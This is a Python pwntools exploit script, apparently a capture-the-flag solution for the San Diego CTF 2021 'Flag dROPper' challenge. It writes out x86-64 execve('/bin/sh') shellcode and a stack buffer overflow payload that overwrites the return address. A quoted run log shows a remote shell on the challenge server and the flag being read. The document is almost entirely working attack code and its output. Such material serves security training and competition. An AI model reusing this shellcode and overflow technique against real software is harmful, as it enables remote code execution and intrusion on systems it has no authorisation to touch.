from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './flagDropper'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "dropper.sdc.tf"
  PORT = 1337
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

shellcode = '\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05'

s.recvuntil("CATCH\nf")

buf  = shellcode
buf += "A"*(72-len(buf))
buf += p64(0x6010a4)
#pause()
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/San_Diego_CTF_2021/Pwn_Flag_dROPper$ python solve.py r
[*] '/home/mito/CTF/San_Diego_CTF_2021/Pwn_Flag_dROPper/flagDropper'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Opening connection to dropper.sdc.tf on port 1337: Done
[*] Switching to interactive mode
uid=1000(user) gid=1000(user) groups=1000(user)
$ ls -l
total 60
lrwxrwxrwx   1 nobody nogroup    7 Apr 16 05:11 bin -> usr/bin
drwxr-xr-x   2 nobody nogroup 4096 Apr 15  2020 boot
drwxr-xr-x   2 nobody nogroup 4096 Apr 16 05:33 dev
drwxr-xr-x  30 nobody nogroup 4096 May  7 20:04 etc
-rw-r--r--   1 nobody nogroup   22 Apr 18 05:19 flag.txt
drwxr-xr-x   3 nobody nogroup 4096 May  7 20:53 home
lrwxrwxrwx   1 nobody nogroup    7 Apr 16 05:11 lib -> usr/lib
lrwxrwxrwx   1 nobody nogroup    9 Apr 16 05:11 lib32 -> usr/lib32
lrwxrwxrwx   1 nobody nogroup    9 Apr 16 05:11 lib64 -> usr/lib64
lrwxrwxrwx   1 nobody nogroup   10 Apr 16 05:11 libx32 -> usr/libx32
drwxr-xr-x   2 nobody nogroup 4096 Apr 16 05:11 media
drwxr-xr-x   2 nobody nogroup 4096 Apr 16 05:11 mnt
drwxr-xr-x   2 nobody nogroup 4096 Apr 16 05:11 opt
dr-xr-xr-x 280 nobody nogroup    0 May  8 22:53 proc
drwx------   2 nobody nogroup 4096 Apr 16 05:32 root
drwxr-xr-x   5 nobody nogroup 4096 Apr 23 22:21 run
lrwxrwxrwx   1 nobody nogroup    8 Apr 16 05:11 sbin -> usr/sbin
drwxr-xr-x   2 nobody nogroup 4096 Apr 16 05:11 srv
drwxr-xr-x   2 nobody nogroup 4096 Apr 15  2020 sys
drwxrwxrwt   2 nobody nogroup 4096 Apr 16 05:33 tmp
drwxr-xr-x  13 nobody nogroup 4096 Apr 16 05:11 usr
drwxr-xr-x  11 nobody nogroup 4096 Apr 16 05:32 var
$ cat flag.txt
sdctf{n1C3_C4tcH_bUd}
'''

